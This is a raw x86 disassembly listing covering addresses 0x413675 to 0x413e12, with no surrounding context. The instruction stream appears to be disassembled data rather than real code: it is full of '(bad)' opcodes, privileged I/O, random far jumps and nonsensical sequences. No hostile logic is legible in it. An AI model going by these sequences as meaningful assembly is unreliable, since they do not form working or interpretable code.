  413675:	mov    ecx,DWORD PTR [edi-0x3c50dd25]
  41367b:	cld    
  41367c:	or     BYTE PTR [edx],cl
  41367e:	jmp    0x4136e2
  413680:	add    ebp,ebp
  413682:	(bad)  
  413683:	fidivr WORD PTR [esp+edi*1+0x63]
  413687:	mov    al,0xf9
  413689:	fwait
  41368a:	in     eax,dx
  41368b:	hlt    
  41368c:	in     al,0x9f
  41368e:	push   ss
  41368f:	sub    al,0xff
  413691:	sbb    eax,0xd2b3e4fe
  413696:	psubusw mm3,mm4
  413699:	std    
  41369a:	mov    bl,0x19
  41369c:	jge    0x4136f6
  41369e:	xor    al,0xf1
  4136a0:	aas    
  4136a1:	xchg   ebx,eax
  4136a2:	ja     0x41366a
  4136a4:	pop    esi
  4136a5:	xor    DWORD PTR [ecx+ecx*1-0x1e2cb855],0xf1e9e1dd
  4136b0:	sbb    DWORD PTR [edi-0x285c1f05],ebx
  4136b6:	cmp    dl,BYTE PTR [esi+0x1a]
  4136b9:	mov    edi,0xefbd20ca
  4136be:	jmp    0xf49379db
  4136c3:	out    dx,eax
  4136c4:	xor    dh,BYTE PTR [ecx]
  4136c6:	jle    0x41364e
  4136c8:	pusha  
  4136c9:	pushf  
  4136ca:	arpl   dx,bp
  4136cc:	mov    esp,0xd32f87ce
  4136d1:	test   eax,0x20db5623
  4136d6:	adc    ebx,0xfffffffb
  4136d9:	jle    0x413732
  4136db:	(bad)  
  4136dc:	fcomip st,st(7)
  4136de:	add    BYTE PTR [eax+0x5b],bh
  4136e1:	add    eax,DWORD PTR [eax]
  4136e3:	sub    ch,bl
  4136e5:	dec    eax
  4136e6:	adc    ebx,0x1b
  4136e9:	aad    0x53
  4136eb:	js     0x41370f
  4136ed:	nop
  4136ee:	imul   DWORD PTR [ecx+0x7b92b932]
  4136f4:	daa    
  4136f5:	stos   BYTE PTR es:[edi],al
  4136f6:	enter  0xa677,0xf9
  4136fa:	repnz adc al,0x51
  4136fd:	dec    ebp
  4136fe:	adc    edx,DWORD PTR [ecx-0x34]
  413701:	or     DWORD PTR [edx+edi*8],ebp
  413704:	scas   eax,DWORD PTR es:[edi]
  413705:	daa    
  413706:	les    esi,FWORD PTR [ecx]
  413708:	pop    ss
  413709:	mov    esi,0x4a544d37
  41370e:	xchg   esi,eax
  41370f:	cmc    
  413710:	iret   
  413711:	out    dx,eax
  413712:	ret    
  413713:	jg     0x4136d9
  413715:	into   
  413716:	pop    eax
  413717:	mul    cl
  413719:	iret   
  41371a:	cwde   
  41371b:	fstp   st(4)
  41371d:	pop    edi
  41371e:	mov    dl,cl
  413720:	int    0x30
  413722:	ins    BYTE PTR es:[edi],dx
  413723:	shl    DWORD PTR [edi],cl
  413725:	enter  0x5b38,0x51
  413729:	adc    DWORD PTR [ebp-0x52881f80],0xa23ca896
  413733:	push   eax
  413734:	lahf   
  413735:	shl    DWORD PTR [esi],cl
  413737:	(bad)  
  413738:	icebp  
  413739:	hlt    
  41373a:	cmp    dh,BYTE PTR ds:0x6fcfa3ce
  413740:	(bad)  
  413741:	loop   0x413746
  413743:	lods   eax,DWORD PTR ds:[esi]
  413744:	mov    eax,0x58cec773
  413749:	inc    BYTE PTR [edi-0x742e17d1]
  41374f:	jecxz  0x4137b3
  413751:	out    dx,al
  413752:	or     DWORD PTR [edi],eax
  413754:	jecxz  0x41373c
  413756:	mov    edi,DWORD PTR [esi-0xf01a0f0]
  41375c:	mov    ch,0x3
  41375e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41375f:	mov    ds:0x44a83285,al
  413764:	sbb    DWORD PTR [ebp+0x19],edx
  413767:	adc    al,0x74
  413769:	fxch   st(6)
  41376b:	cmp    edi,ebx
  41376d:	out    0xe4,eax
  41376f:	loope  0x413739
  413771:	ja     0x41373b
  413773:	call   0xf29d:0xe40a1461
  41377a:	sbb    eax,0x7c48f7bd
  41377f:	mov    eax,ds:0x3c5770f0
  413784:	vpor   xmm4,xmm6,XMMWORD PTR [eax+0x20]
  413789:	cmp    BYTE PTR [edx+0x1d],ah
  41378c:	aam    0x19
  41378e:	or     DWORD PTR [edi-0x7803508b],esi
  413794:	cdq    
  413795:	ss jmp 0x2fcc:0xf43cf49f
  41379d:	dec    ebp
  41379e:	icebp  
  41379f:	(bad)  
  4137a0:	xchg   esp,eax
  4137a1:	dec    eax
  4137a2:	xor    eax,0xf705ef2f
  4137a7:	and    edi,esi
  4137a9:	xor    bh,ah
  4137ab:	fwait
  4137ac:	mov    edi,0x6c7b1b8e
  4137b1:	into   
  4137b2:	push   edi
  4137b3:	xchg   esi,eax
  4137b4:	xor    BYTE PTR [esi-0x3a800bd9],bl
  4137ba:	or     bh,ch
  4137bc:	(bad)
  4137bf:	pop    edi
  4137c0:	jnp    0x413823
  4137c2:	add    dl,BYTE PTR [ecx-0x5f2d5db1]
  4137c8:	adc    eax,0xb599526c
  4137cd:	(bad)  
  4137ce:	shl    BYTE PTR [edi-0xa343e7f],1
  4137d4:	ja     0x413802
  4137d6:	cmp    ch,BYTE PTR [edi]
  4137d8:	std    
  4137d9:	jo     0x413766
  4137db:	sbb    bh,BYTE PTR [esi+0x1d5d4bb2]
  4137e1:	jecxz  0x41383f
  4137e3:	xchg   esp,eax
  4137e4:	inc    eax
  4137e5:	pop    edi
  4137e6:	xchg   edi,eax
  4137e7:	hlt    
  4137e8:	cmp    BYTE PTR [esi],ah
  4137ea:	gs jo  0x41386b
  4137ed:	std    
  4137ee:	cmp    BYTE PTR [eax],ah
  4137f0:	jmp    0xdd901139
  4137f5:	mov    cl,0xf
  4137f7:	push   esi
  4137f8:	add    esi,eax
  4137fa:	gs sbb edi,eax
  4137fd:	fstp   QWORD PTR [eax-0x56]
  413800:	mov    ah,0x44
  413802:	xor    esi,eax
  413804:	in     eax,dx
  413805:	push   esi
  413806:	sbb    dl,bh
  413808:	push   cs
  413809:	mov    edi,DWORD PTR [edx+0x26]
  41380c:	dec    ebp
  41380d:	inc    edx
  41380e:	xchg   ecx,eax
  41380f:	add    eax,0x7662bd9c
  413814:	int3   
  413815:	std    
  413816:	rcl    DWORD PTR [edi+0x6],1
  413819:	mov    eax,ds:0x2b902600
  41381e:	add    al,0xa4
  413820:	jo     0x41387e
  413822:	push   ds
  413823:	arpl   WORD PTR [edi+0x68],bx
  413826:	clc    
  413827:	push   0x64
  413829:	add    al,0x36
  41382b:	adc    eax,0x698b2eb4
  413830:	repnz push ebx
  413832:	jmp    0xe2ba7c8e
  413837:	call   0x25a2:0xe60c791
  41383e:	inc    esp
  41383f:	push   esi
  413840:	dec    edi
  413841:	in     al,dx
  413842:	mov    eax,ebx
  413844:	xchg   edx,eax
  413845:	xchg   DWORD PTR [eax-0x30],esi
  413848:	mov    DWORD PTR [eax-0x6f56787],ebx
  41384e:	test   DWORD PTR [ebp+0x647c6e8d],esi
  413854:	sti    
  413855:	sub    DWORD PTR [ecx+edx*8],0x55ac9b54
  41385c:	mov    eax,ds:0xdacb4758
  413861:	and    edi,eax
  413863:	ins    BYTE PTR es:[edi],dx
  413864:	call   0xbd38d666
  413869:	mov    eax,ebp
  41386b:	mov    esi,0x10134fea
  413870:	or     al,0x3c
  413872:	popa   
  413873:	fistp  QWORD PTR [eax]
  413875:	sbb    DWORD PTR [edx-0x2f],esp
  413878:	adc    BYTE PTR [esi],dl
  41387a:	into   
  41387b:	sti    
  41387c:	xor    DWORD PTR [edx+eax*1+0x34],0x40
  413881:	sbb    DWORD PTR ds:0x151a31b1,esp
  413887:	scas   eax,DWORD PTR es:[edi]
  413888:	fcomi  st,st(3)
  41388a:	test   eax,ebx
  41388c:	sti    
  41388d:	ror    ah,1
  41388f:	pop    edx
  413890:	jl     0x413828
  413892:	xor    BYTE PTR [ebp+0x63542342],dl
  413898:	fs sbb eax,0x95f57e0f
  41389e:	xor    edi,edi
  4138a0:	rcl    DWORD PTR [edi-0x39],cl
  4138a3:	aad    0x57
  4138a5:	in     al,dx
  4138a6:	into   
  4138a7:	loop   0x41390d
  4138a9:	add    eax,0xcff4a7ee
  4138ae:	jae    0x4138f0
  4138b0:	pop    ebx
  4138b1:	dec    eax
  4138b2:	(bad)  
  4138b4:	daa    
  4138b5:	in     eax,dx
  4138b6:	mov    ah,0x1e
  4138b8:	add    al,BYTE PTR [edx+0x481c3b1b]
  4138be:	dec    edx
  4138bf:	repnz cmp cl,BYTE PTR [eax]
  4138c2:	pop    eax
  4138c3:	fist   WORD PTR [edx+0x7f1e7b6c]
  4138c9:	jnp    0x4138af
  4138cb:	fwait
  4138cc:	jl     0x413894
  4138ce:	lods   eax,DWORD PTR ds:[esi]
  4138cf:	ret    0x2b28
  4138d2:	cs in  eax,0xd8
  4138d5:	(bad)  
  4138d6:	lods   eax,DWORD PTR ds:[esi]
  4138d7:	mov    edx,0x1c7cd279
  4138dc:	adc    ebp,DWORD PTR [edi]
  4138de:	jmp    0xebef7d31
  4138e3:	push   0x57
  4138e5:	sub    DWORD PTR [edi],eax
  4138e7:	and    BYTE PTR [eax+eiz*4],0x6f
  4138eb:	inc    esi
  4138ec:	push   eax
  4138ed:	inc    ebp
  4138ee:	push   esp
  4138ef:	neg    BYTE PTR gs:[eax+0x44]
  4138f3:	cmp    esp,ebx
  4138f5:	scas   eax,DWORD PTR es:[edi]
  4138f6:	mov    ebp,0xa9f521a3
  4138fb:	adc    ch,dl
  4138fd:	sub    al,BYTE PTR [ecx-0x25]
  413900:	scas   al,BYTE PTR es:[edi]
  413901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413902:	icebp  
  413903:	push   esp
  413904:	std    
  413905:	not    DWORD PTR [ebp-0x1c]
  413908:	mov    ebx,0x66b39ed1
  41390d:	outs   dx,BYTE PTR ds:[esi]
  41390e:	sub    al,0xb8
  413910:	loop   0x413919
  413912:	jmp    0x23d2e552
  413917:	scas   al,BYTE PTR es:[edi]
  413918:	inc    ebx
  413919:	push   edx
  41391a:	or     al,0x59
  41391c:	icebp  
  41391d:	lahf   
  41391e:	lahf   
  41391f:	cli    
  413920:	bnd call 0x7274706c
  413926:	sbb    eax,0xed2adb27
  41392b:	addr16 push eax
  41392d:	pop    ecx
  41392e:	push   0xf915a592
  413933:	repnz sbb BYTE PTR [edi+0x403831f3],bh
  41393a:	push   0xbc3dc722
  41393f:	out    0x5e,eax
  413941:	fsub   DWORD PTR [esi-0x6cc3b91a]
  413947:	(bad)  [edx-0x25a21705]
  41394d:	jbe    0x41390e
  41394f:	jnp    0x4138ed
  413951:	jno    0x4138d3
  413953:	test   DWORD PTR [eax-0x1c41bd9f],edx
  413959:	pop    eax
  41395a:	es in  al,0x1a
  41395d:	cld    
  41395e:	lods   eax,DWORD PTR ds:[esi]
  41395f:	pop    edi
  413960:	mov    esp,0xc9ff5630
  413965:	xchg   ah,dh
  413967:	fwait
  413968:	psllq  mm1,mm6
  41396b:	jl     0x41392f
  41396d:	mov    edi,ss
  41396f:	push   esp
  413970:	jecxz  0x413906
  413972:	in     al,0x5c
  413974:	cli    
  413975:	dec    esp
  413976:	fadd   DWORD PTR [edx]
  413978:	push   edi
  413979:	inc    ebx
  41397a:	fmul   st(3),st
  41397c:	jb     0x4139b7
  41397e:	adc    eax,0x39afcdcc
  413983:	mov    al,0x7f
  413985:	mov    eax,0xe3b3a36f
  41398a:	jne    0x4139b5
  41398c:	pop    di
  41398e:	test   dl,0xf7
  413991:	(bad)  
  413992:	(bad)  
  413993:	pop    ebx
  413994:	addr16 (bad) 
  413996:	jne    0x413995
  413998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413999:	out    0x74,al
  41399b:	jne    0x413926
  41399d:	in     al,dx
  41399e:	push   es
  41399f:	jg     0x413a19
  4139a1:	mov    fs,WORD PTR [ebx-0x21]
  4139a4:	test   eax,0xcfc2c427
  4139a9:	jl     0x4139d0
  4139ab:	push   cs
  4139ac:	jns    0x413985
  4139ae:	sub    edx,edx
  4139b0:	fld    DWORD PTR [eax+edi*2]
  4139b3:	inc    edx
  4139b4:	adc    DWORD PTR [ebx-0x7e],ebx
  4139b7:	mov    ch,0xe0
  4139b9:	add    DWORD PTR [ecx+0x65840fb4],esp
  4139bf:	jmp    0x413a0d
  4139c1:	ret    0x90f0
  4139c4:	out    dx,eax
  4139c5:	jl     0x4139e7
  4139c7:	sbb    eax,0xcf073723
  4139cc:	jmp    0x80ad240
  4139d1:	int3   
  4139d2:	(bad)  
  4139d4:	jnp    0x4139c7
  4139d6:	enter  0xf3ca,0xd3
  4139da:	pop    ecx
  4139db:	jge    0x413994
  4139dd:	(bad)  
  4139de:	sti    
  4139df:	aaa    
  4139e0:	arpl   di,sp
  4139e2:	scas   eax,DWORD PTR es:[edi]
  4139e3:	(bad)  [ecx-0x11]
  4139e6:	jge    0x413977
  4139e8:	fs loope 0x413a4f
  4139eb:	sub    eax,0xa87b527d
  4139f0:	in     eax,0xb5
  4139f2:	ficom  DWORD PTR [ecx-0x126a31da]
  4139f8:	jmp    0x7a24e259
  4139fd:	xor    al,0x7b
  4139ff:	mov    ds:0xf82e180c,eax
  413a04:	pushf  
  413a05:	repz push ds
  413a07:	aad    0xa5
  413a09:	in     al,dx
  413a0a:	dec    eax
  413a0b:	xor    BYTE PTR ds:0xd6ba09ea,ch
  413a11:	pop    eax
  413a12:	or     DWORD PTR [ecx-0x24],edi
  413a15:	mov    ds:0x2a3c62b5,eax
  413a1a:	push   ecx
  413a1b:	inc    ecx
  413a1c:	xor    eax,0xc06ceecb
  413a21:	or     eax,0xe4557f80
  413a26:	or     DWORD PTR [eax-0x5719c399],edx
  413a2c:	cmp    cl,ch
  413a2e:	aas    
  413a2f:	fidiv  WORD PTR [esi]
  413a31:	mov    bl,0x34
  413a33:	(bad)  
  413a34:	repz dec esp
  413a36:	aas    
  413a37:	aas    
  413a38:	jecxz  0x4139e6
  413a3a:	mov    eax,0x9c1c7af3
  413a3f:	fstp   DWORD PTR ds:0x30f7c31
  413a45:	push   esp
  413a46:	clc    
  413a47:	xor    DWORD PTR ds:[esi-0x44d5e51],edi
  413a4e:	aam    0xdb
  413a50:	lock jae 0x413a4a
  413a53:	fcomp  DWORD PTR [ebp-0x76bc6ae8]
  413a59:	gs jns 0x413aae
  413a5c:	xchg   DWORD PTR [ebx-0x57daf5a7],edx
  413a62:	in     al,0x2e
  413a64:	jg     0x413a2c
  413a66:	std    
  413a67:	stos   BYTE PTR es:[edi],al
  413a68:	ins    BYTE PTR es:[edi],dx
  413a69:	cmp    dl,BYTE PTR [edi]
  413a6b:	mov    ch,0xdc
  413a6d:	aas    
  413a6e:	adc    DWORD PTR [ebx-0x71],eax
  413a71:	push   esp
  413a72:	lds    esi,FWORD PTR [eax-0x5]
  413a75:	jo     0x413a8c
  413a77:	mov    ds:0x660ca4a0,eax
  413a7c:	inc    edx
  413a7d:	cli    
  413a7e:	shl    DWORD PTR [ecx+0x79],0xa2
  413a82:	fsub   st,st(7)
  413a84:	mov    ebx,0xee42d5e4
  413a89:	jne    0x413ab0
  413a8b:	jne    0x413aca
  413a8d:	push   ebx
  413a8e:	and    dh,0x77
  413a91:	mov    ch,0x7d
  413a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a94:	cli    
  413a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a96:	dec    ecx
  413a97:	dec    esi
  413a98:	gs push ebp
  413a9a:	sahf   
  413a9b:	loopne 0x413ab9
  413a9d:	xchg   edi,eax
  413a9e:	mov    ebx,0x2415cfd1
  413aa3:	cmp    esi,esi
  413aa5:	cdq    
  413aa6:	daa    
  413aa7:	(bad)  
  413aa8:	cmc    
  413aa9:	jae    0x413aa1
  413aab:	cdq    
  413aac:	lahf   
  413aad:	jnp    0x413ad1
  413aaf:	fsubr  QWORD PTR [ebp+0x40]
  413ab2:	popf   
  413ab3:	mov    WORD PTR [ebx],?
  413ab5:	add    al,0xd5
  413ab7:	inc    edi
  413ab8:	iret   
  413ab9:	xlat   BYTE PTR ds:[ebx]
  413aba:	test   al,0x6c
  413abc:	push   esp
  413abd:	xlat   BYTE PTR ds:[ebx]
  413abe:	mov    edx,0xa0eaa6d6
  413ac3:	add    esp,esi
  413ac5:	enter  0xc0e3,0x4e
  413ac9:	add    ebx,DWORD PTR [ebp+0x51]
  413acc:	sbb    eax,DWORD PTR [ebp-0x1e7aa95]
  413ad2:	mov    ecx,0x9b2a9c26
  413ad7:	dec    eax
  413ad8:	(bad)  
  413ad9:	ins    DWORD PTR es:[edi],dx
  413ada:	mov    ch,0x8e
  413adc:	dec    ecx
  413add:	sbb    ecx,DWORD PTR [esi+eiz*1+0x263828a6]
  413ae4:	adc    ebx,DWORD PTR [edi-0x2e]
  413ae7:	repz dec esp
  413ae9:	sub    ecx,DWORD PTR [esi+0x5b]
  413aec:	adc    dl,BYTE PTR [edi-0xb]
  413aef:	ja     0x413ab4
  413af1:	mov    cl,0x7f
  413af3:	mov    ch,0xd4
  413af5:	(bad)  
  413af6:	mov    eax,0xdf9d27cc
  413afb:	sub    eax,ecx
  413afd:	aam    0x91
  413aff:	(bad)  
  413b00:	xchg   ebx,eax
  413b01:	inc    esi
  413b02:	(bad)  
  413b03:	out    dx,eax
  413b04:	cmp    al,0x56
  413b06:	jbe    0x413b37
  413b08:	pop    esi
  413b09:	(bad)  
  413b0a:	xor    BYTE PTR [ecx+0x43],ah
  413b0d:	mov    ds:0xe68d64f1,eax
  413b12:	pop    ecx
  413b13:	and    al,BYTE PTR [esi+0xd]
  413b16:	inc    ebp
  413b17:	add    DWORD PTR [esi+0x43],eax
  413b1a:	adc    al,0xca
  413b1c:	push   ecx
  413b1d:	mov    ebp,0x9f8a1504
  413b22:	dec    edi
  413b23:	inc    ebp
  413b24:	push   cs
  413b25:	dec    esp
  413b26:	push   ebp
  413b27:	in     al,0xdb
  413b29:	push   eax
  413b2a:	adc    eax,0xa3a73400
  413b2f:	loope  0x413abc
  413b31:	add    ch,BYTE PTR [esi+0x599e2887]
  413b37:	push   esi
  413b38:	in     eax,0x75
  413b3a:	ret    
  413b3b:	push   edx
  413b3c:	test   DWORD PTR [ebx-0x2a],esi
  413b3f:	call   0x70b42a37
  413b44:	xor    BYTE PTR [ebp-0x23],dh
  413b47:	jmp    0x1a10e4da
  413b4c:	xchg   edi,eax
  413b4d:	jle    0x413b46
  413b4f:	push   0xef71f159
  413b54:	mov    ds:0x4d8956d0,eax
  413b59:	push   0xffffff9c
  413b5b:	dec    edi
  413b5c:	pop    ebp
  413b5d:	icebp  
  413b5e:	mov    esi,0x73afdc86
  413b63:	aam    0xb2
  413b65:	cli    
  413b66:	mov    ch,0x78
  413b68:	or     BYTE PTR [eax-0x6e],dl
  413b6b:	xchg   ebp,eax
  413b6c:	out    0x92,eax
  413b6e:	pushf  
  413b6f:	int    0x97
  413b71:	repnz dec ebx
  413b73:	sub    DWORD PTR [eax+edx*2],eax
  413b76:	push   es
  413b77:	mov    al,ds:0x2e27489e
  413b7c:	and    dl,BYTE PTR [edi-0x7e]
  413b7f:	shl    BYTE PTR [eax+ebp*4],cl
  413b82:	stos   BYTE PTR es:[di],al
  413b84:	and    edx,DWORD PTR [edi+0x18]
  413b87:	dec    edi
  413b88:	jl     0x413b1b
  413b8a:	jbe    0x413bd2
  413b8c:	mov    WORD PTR [edx-0x6b],ss
  413b8f:	push   edx
  413b90:	add    cl,BYTE PTR [esi+0x7]
  413b93:	scas   al,BYTE PTR es:[edi]
  413b94:	pusha  
  413b95:	shl    bh,0xe
  413b98:	push   esp
  413b99:	mov    bl,BYTE PTR [edx-0x540a4ad4]
  413b9f:	adc    eax,0x53d3dfc3
  413ba4:	das    
  413ba5:	scas   eax,DWORD PTR es:[edi]
  413ba6:	jno    0x413bc3
  413ba8:	scas   eax,DWORD PTR es:[edi]
  413ba9:	jecxz  0x413c28
  413bab:	lods   eax,DWORD PTR ds:[esi]
  413bac:	inc    edx
  413bad:	fucomp st(4)
  413baf:	sub    ebp,DWORD PTR [edi+0x464fc4e1]
  413bb5:	cmp    DWORD PTR [eax+edx*2-0x80],ebx
  413bb9:	sub    al,0x21
  413bbb:	mov    dl,0x86
  413bbd:	inc    esi
  413bbe:	push   ds
  413bbf:	xor    esi,DWORD PTR [edx+0x6e]
  413bc2:	push   esp
  413bc3:	xchg   esi,eax
  413bc4:	cld    
  413bc5:	scas   al,BYTE PTR es:[edi]
  413bc6:	mov    ds,esp
  413bc8:	mov    ds:0x4554b53b,eax
  413bcd:	rcl    BYTE PTR [eax],cl
  413bcf:	lds    eax,FWORD PTR [ebx+0xa]
  413bd2:	push   edi
  413bd3:	(bad)  
  413bd4:	push   esi
  413bd5:	in     al,0x7a
  413bd7:	push   eax
  413bd8:	mov    DWORD PTR [ebp+ebx*2+0x4a1e7d21],ecx
  413bdf:	icebp  
  413be0:	test   eax,0xd025bde
  413be5:	rdtsc  
  413be7:	cmp    eax,0xacef7344
  413bec:	fidiv  WORD PTR [esi-0x92846eb]
  413bf2:	lea    ecx,ds:[ebx]
  413bf5:	pop    ebp
  413bf6:	dec    ebx
  413bf7:	vpavgb ymm1,ymm3,YMMWORD PTR [edi+esi*4]
  413bfc:	les    ecx,FWORD PTR [esp+edx*4-0x73]
  413c00:	cmp    BYTE PTR [eax],dl
  413c02:	xor    eax,0xd67e3bec
  413c07:	mov    ah,0xcf
  413c09:	sbb    eax,0xd407393c
  413c0e:	pop    ds
  413c0f:	lods   eax,DWORD PTR ds:[esi]
  413c10:	mov    bl,0x6d
  413c12:	xlat   BYTE PTR ds:[ebx]
  413c13:	xchg   edi,eax
  413c14:	out    0xc2,al
  413c16:	sbb    eax,0xc59387b2
  413c1b:	push   ebx
  413c1c:	adc    DWORD PTR [ebp-0x38],0xddf1dfcd
  413c23:	mov    eax,0x96ced289
  413c28:	pop    esi
  413c29:	xchg   edi,eax
  413c2a:	xchg   edx,eax
  413c2b:	adc    cl,BYTE PTR [edx+0x57]
  413c2e:	je     0x413c40
  413c30:	push   0x6c
  413c32:	push   ds
  413c33:	pop    edi
  413c34:	sub    esp,DWORD PTR [eax]
  413c36:	mov    al,0xfd
  413c38:	mov    dh,0xd5
  413c3a:	pop    ecx
  413c3b:	mov    ds:0x60c1ee6f,al
  413c40:	xor    al,0xeb
  413c42:	arpl   WORD PTR [ecx+ecx*2],si
  413c45:	test   al,0x61
  413c47:	rol    BYTE PTR [edi+edi*8+0x5e],0x1a
  413c4c:	cwde   
  413c4d:	rcl    DWORD PTR es:[esi+ebx*1-0x52],1
  413c52:	ror    BYTE PTR [esi-0x6d],0x7d
  413c56:	mov    ds:0x610218eb,al
  413c5b:	push   ebx
  413c5c:	jmp    0x29b7:0x7c5aecab
  413c63:	data16 adc dh,BYTE PTR [ebx+0x1a]
  413c67:	not    DWORD PTR [ebx+0x26]
  413c6a:	out    dx,al
  413c6b:	and    eax,0x9994e654
  413c70:	mov    ?,WORD PTR [ebp-0x4a3f2372]
  413c76:	in     eax,dx
  413c77:	mov    eax,ecx
  413c79:	sar    DWORD PTR [ebp+0x6d617f29],0x68
  413c80:	sbb    eax,0x40ad6a25
  413c85:	lods   al,BYTE PTR ds:[esi]
  413c86:	in     al,dx
  413c87:	push   edx
  413c88:	mov    edi,0x4a8d852f
  413c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c8e:	cmp    DWORD PTR [edi],ecx
  413c90:	pushf  
  413c91:	fist   WORD PTR [edx]
  413c93:	cmp    BYTE PTR [eax-0x5e48ce02],0x3a
  413c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c9b:	repz loope 0x413c4f
  413c9e:	mov    dh,0x1a
  413ca0:	jl     0x413c2b
  413ca2:	popf   
  413ca3:	push   eax
  413ca4:	jle    0x413c89
  413ca6:	repnz inc esp
  413ca8:	add    al,0x62
  413caa:	cvtps2pi mm4,QWORD PTR [ebx]
  413cad:	jb     0x413c36
  413caf:	jecxz  0x413cbf
  413cb1:	inc    esp
  413cb2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  413cb4:	in     eax,dx
  413cb5:	stos   BYTE PTR es:[edi],al
  413cb6:	int    0x39
  413cb8:	jo     0x413cf5
  413cba:	sbb    edi,DWORD PTR [edi-0x4c]
  413cbd:	sbb    al,0x42
  413cbf:	inc    esp
  413cc0:	outs   dx,BYTE PTR ds:[esi]
  413cc1:	hlt    
  413cc2:	jp     0x413ca1
  413cc4:	loopne 0x413c9d
  413cc6:	sbb    DWORD PTR [ebx+0x464ac685],0xac5428df
  413cd0:	aam    0xca
  413cd2:	sbb    esi,eax
  413cd4:	nop
  413cd5:	inc    ecx
  413cd6:	cmp    esp,edx
  413cd8:	je     0x413c69
  413cda:	cmc    
  413cdb:	mov    ch,0xac
  413cdd:	jle    0x413d4c
  413cdf:	scas   eax,DWORD PTR es:[edi]
  413ce0:	aam    0x8e
  413ce2:	sub    bh,BYTE PTR [ecx-0x53b07ffe]
  413ce8:	out    0x0,al
  413cea:	pushf  
  413ceb:	xchg   ebp,eax
  413cec:	mov    al,0x6e
  413cee:	(bad)  
  413cef:	mov    ecx,DWORD PTR [ecx+0x571ae4ac]
  413cf5:	push   cs
  413cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cf7:	pop    eax
  413cf8:	ins    DWORD PTR es:[edi],dx
  413cf9:	mov    ebx,0x65443dd6
  413cfe:	std    
  413cff:	ror    edi,1
  413d01:	fst    DWORD PTR [esi+0x24bdcdf6]
  413d07:	pop    edi
  413d08:	sbb    esi,0xffffffaf
  413d0b:	(bad)  
  413d0c:	jl     0x413d07
  413d0e:	aam    0x41
  413d10:	ret    
  413d11:	fst    DWORD PTR [ebx+edi*1-0xe]
  413d15:	jne    0x413d7b
  413d17:	add    eax,0x954c550c
  413d1c:	and    edi,eax
  413d1e:	into   
  413d1f:	adc    DWORD PTR ds:[eax+0x35],esp
  413d23:	mov    eax,?
  413d25:	lock test eax,0xf91dea04
  413d2b:	lods   al,BYTE PTR ds:[esi]
  413d2c:	imul   ebp,edi,0xc3757635
  413d32:	je     0x413cba
  413d34:	loope  0x413d7c
  413d36:	out    0xef,eax
  413d38:	xor    eax,0xd7a90f4e
  413d3d:	cmc    
  413d3e:	xor    BYTE PTR [edx+0x2c],0x79
  413d42:	pop    ebp
  413d43:	xlat   BYTE PTR ds:[ebx]
  413d44:	or     edi,esi
  413d46:	cli    
  413d47:	retf   0x5516
  413d4a:	push   ss
  413d4b:	stos   BYTE PTR es:[edi],al
  413d4c:	inc    ebx
  413d4d:	in     eax,dx
  413d4e:	sub    BYTE PTR [ebx],al
  413d50:	inc    edi
  413d51:	dec    ecx
  413d52:	push   esi
  413d53:	popa   
  413d54:	jne    0x413d7f
  413d56:	pop    ebx
  413d57:	lock iret 
  413d59:	mov    DWORD PTR [ebp-0x4706daaf],0xa439c72c
  413d63:	add    al,0x0
  413d65:	jl     0x413d83
  413d67:	pop    eax
  413d68:	jecxz  0x413cf6
  413d6a:	xchg   edx,eax
  413d6b:	and    BYTE PTR [ebx+eiz*2+0x4a41545a],dh
  413d72:	je     0x413dc2
  413d74:	or     eax,0xa9c3d56
  413d79:	pop    eax
  413d7a:	imul   edi,DWORD PTR [ecx+ebp*2+0x42],0xab4d107c
  413d82:	mov    ebx,0x3fb0ba14
  413d87:	or     ah,BYTE PTR [esi+0x75]
  413d8a:	popa   
  413d8b:	mov    dl,0x26
  413d8d:	lods   al,BYTE PTR ds:[esi]
  413d8e:	scas   eax,DWORD PTR es:[edi]
  413d8f:	adc    DWORD PTR ds:[edx],ecx
  413d92:	test   BYTE PTR [esi],ch
  413d94:	ins    BYTE PTR es:[edi],dx
  413d95:	jmp    FWORD PTR [ebx+eiz*2+0x5d38e8f7]
  413d9c:	ds pop ebp
  413d9e:	sti    
  413d9f:	pushf  
  413da0:	retf   0x6255
  413da3:	dec    ebp
  413da4:	sbb    dh,bh
  413da6:	cmp    esi,DWORD PTR [ebx]
  413da8:	lock cmp cl,BYTE PTR [eax]
  413dab:	or     al,0xfa
  413dad:	call   0x2f7c:0x8c9e3285
  413db4:	test   dh,cl
  413db6:	cmp    DWORD PTR [ebx+0x1e],eax
  413db9:	cmc    
  413dba:	(bad)  
  413dbb:	in     al,dx
  413dbc:	inc    edi
  413dbd:	adc    eax,0x52825cc3
  413dc2:	ins    BYTE PTR es:[edi],dx
  413dc3:	push   ss
  413dc4:	popf   
  413dc5:	ja     0x413dd6
  413dc7:	xchg   edi,eax
  413dc8:	cmp    BYTE PTR [edi],bh
  413dca:	mov    ch,0xf5
  413dcc:	inc    ebp
  413dcd:	inc    ebx
  413dce:	sub    BYTE PTR [edi+0x2c],dh
  413dd1:	cs inc edi
  413dd3:	xchg   ebp,eax
  413dd4:	xchg   DWORD PTR [edx],ebx
  413dd6:	cmp    bl,bl
  413dd8:	lods   al,BYTE PTR ds:[esi]
  413dd9:	and    cl,BYTE PTR [edi+0x10]
  413ddc:	jmp    0xa513:0x648f3a3d
  413de3:	adc    BYTE PTR [edi-0xb],dl
  413de6:	test   DWORD PTR [edx-0x3c29215e],edi
  413dec:	stos   BYTE PTR es:[edi],al
  413ded:	cmp    al,BYTE PTR [esi+0x59]
  413df0:	xchg   ecx,eax
  413df1:	jnp    0x413de3
  413df3:	mov    BYTE PTR [ecx-0x43],dl
  413df6:	push   esi
  413df7:	stc    
  413df8:	js     0x413db2
  413dfa:	mov    al,ds:0x56e04880
  413dff:	not    BYTE PTR [eax]
  413e01:	test   esi,esi
  413e03:	mov    BYTE PTR [ebp+0x43b6a5e8],0xea
  413e0a:	dec    esi
  413e0b:	retf   
  413e0c:	adc    BYTE PTR [eax+eiz*4],0xa3
  413e10:	ja     0x413e7b
  413e12:	push   eax
